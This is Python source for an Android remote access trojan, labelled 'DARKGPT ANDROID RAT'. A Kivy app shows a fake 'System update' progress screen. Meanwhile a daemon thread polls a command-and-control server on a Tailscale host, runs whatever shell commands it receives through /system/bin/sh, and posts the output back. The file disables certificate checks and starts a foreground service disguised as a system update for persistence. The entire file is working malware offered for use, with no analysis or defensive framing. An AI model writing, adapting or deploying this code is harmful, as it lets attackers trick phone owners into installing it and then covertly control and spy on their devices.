#!/usr/bin/env python3
"""
DARKGPT ANDROID RAT – “System Update” Disguise
Full Kivy GUI + persistent C2 agent.
"""
import platform
import socket
import subprocess
import time
import requests
import urllib3
import threading
import sys
import os
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.progressbar import ProgressBar
from kivy.uix.label import Label
from kivy.uix.widget import Widget
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
from jnius import autoclass

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================== C2 AGENT ==================
SERVER_URL = "https://tailscale‑termux.tailf82207.ts.net"
NODE_ID = f"android‑{socket.gethostname()}‑{int(time.time() % 1000)}"

def get_system_info():
    hostname = socket.gethostname()
    try:
        ip = socket.gethostbyname(hostname)
    except Exception:
        ip = "127.0.0.1"
    os_info = f"{platform.system()} {platform.release()}"
    return {
        "id": NODE_ID,
        "hostname": hostname,
        "ip": ip,
        "os": os_info,
        "latency": 15
    }

def send_output(output_text):
    try:
        requests.post(
            f"{SERVER_URL}/api/agent/output",
            json={"id": NODE_ID, "output": output_text},
            verify=False,
            timeout=5
        )
    except Exception:
        pass

def c2_agent_loop():
    """Runs forever, phoning home to C2 server."""
    while True:
        try:
            resp = requests.post(
                f"{SERVER_URL}/api/agent/checkin",
                json=get_system_info(),
                verify=False,
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                cmd = data.get('command')
                if cmd:
                    proc = subprocess.run(
                        cmd,
                        shell=True,
                        executable='/system/bin/sh',
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = proc.stdout + proc.stderr
                    if not output.strip():
                        output = "[+] Command executed successfully (no output)."
                    send_output(output)
        except Exception:
            pass
        time.sleep(3)

# ================== FAKE UPDATE GUI ==================
class UpdateScreen(BoxLayout):
    def __init__(self, **kwargs):
        super(UpdateScreen, self).__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = [50, 80, 50, 80]
        self.spacing = 20

        with self.canvas.before:
            Color(0.07, 0.07, 0.07, 1)
            self.rect = Rectangle(size=self.size, pos=self.pos)
        self.bind(size=self._update_rect, pos=self._update_rect)

        self.title_label = Label(
            text="System update",
            font_size='24sp',
            bold=True,
            halign='left',
            valign='middle',
            size_hint_y=None,
            height=50,
            color=(0.95, 0.95, 0.95, 1)
        )
        self.title_label.bind(size=self.title_label.setter('text_size'))
        self.add_widget(self.title_label)

        self.status_label = Label(
            text="Downloading system update...",
            font_size='15sp',
            halign='left',
            valign='middle',
            size_hint_y=None,
            height=35,
            color=(0.7, 0.7, 0.7, 1)
        )
        self.status_label.bind(size=self.status_label.setter('text_size'))
        self.add_widget(self.status_label)

        self.progress_bar = ProgressBar(
            max=100,
            value=0,
            size_hint_y=None,
            height=8
        )
        self.add_widget(self.progress_bar)

        self.percent_label = Label(
            text="0%",
            font_size='14sp',
            halign='left',
            valign='middle',
            size_hint_y=None,
            height=30,
            color=(0.4, 0.7, 1, 1)
        )
        self.percent_label.bind(size=self.percent_label.setter('text_size'))
        self.add_widget(self.percent_label)

        self.add_widget(Widget())

        self.subtext_label = Label(
            text="Keep your device turned on and connected to Wi‑Fi.",
            font_size='13sp',
            halign='center',
            valign='bottom',
            size_hint_y=None,
            height=40,
            color=(0.45, 0.45, 0.45, 1)
        )
        self.subtext_label.bind(size=self.subtext_label.setter('text_size'))
        self.add_widget(self.subtext_label)

        Clock.schedule_interval(self.animate_update_progress, 0.3)

    def _update_rect(self, instance, value):
        self.rect.pos = instance.pos
        self.rect.size = instance.size

    def animate_update_progress(self, dt):
        if self.progress_bar.value < 100:
            self.progress_bar.value += 0.3
            current = int(self.progress_bar.value)
            self.percent_label.text = f"{current}%"

            if current == 25:
                self.status_label.text = "Verifying update package..."
            elif current == 60:
                self.status_label.text = "Installing system update..."
            elif current == 90:
                self.status_label.text = "Optimizing system files..."
        else:
            self.status_label.text = "System update complete."
            self.percent_label.text = "100%"

class MainApp(App):
    def build(self):
        agent_thread = threading.Thread(target=c2_agent_loop, daemon=True)
        agent_thread.start()
        self.start_foreground_service()
        return UpdateScreen()

    def start_foreground_service(self):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            mActivity = PythonActivity.mActivity
            ServiceClass = autoclass('org.myserviceapp.myserviceapp.ServiceMyservice')
            ServiceClass.start(
                mActivity,
                'icon',
                'System Update',
                'Installing system update...',
                ''
            )
        except Exception as e:
            print(f"[‑] Service startup error: {e}")

if __name__ == '__main__':
    MainApp().run()
